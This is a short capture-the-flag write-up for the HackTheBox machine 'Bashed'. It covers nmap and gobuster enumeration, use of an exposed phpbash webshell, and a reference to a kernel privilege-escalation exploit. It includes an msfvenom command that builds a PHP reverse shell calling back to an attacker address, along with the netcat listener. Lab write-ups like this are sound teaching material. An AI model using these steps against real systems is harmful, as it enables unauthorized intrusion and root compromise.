nmap result:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Use gobuster to find interesting directories and files `gobuster dir -u http://10.10.10.68/ -w big.txt -x php`

```
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd.php        (Status: 403) [Size: 299]
/.htpasswd            (Status: 403) [Size: 295]
/.htaccess.php        (Status: 403) [Size: 299]
/config.php           (Status: 200) [Size: 0]  
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]    
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]   
/server-status        (Status: 403) [Size: 299]                                 
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
```

We can find php webshell in here:

```
http://10.10.10.68/dev/phpbash.php
```

`cat /etc/os-release`

```
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.2 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

Finding privelege escalation exploit [44298](https://www.exploit-db.com/exploits/44298) for this version.

Use msfvenom to generate php reverse shell and upload the file to `http://10.10.10.68/uploads/shell.php`

```
msfvenom -p php/reverse_php LHOST=10.10.14.4 LPORT=4444 -f raw > shell.php
```

Listen on reverse shell

```
nc 10.10.14.4 -l 4444
```

Compile and execute the exploit on the target machine and get root flag.

Another way to get root flag is metioned in this [post](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html):

Use [LinEnum.sh](https://github.com/rebootuser/LinEnum) to get possible way to escalate privilege, which leads to sudo as scriptmanager.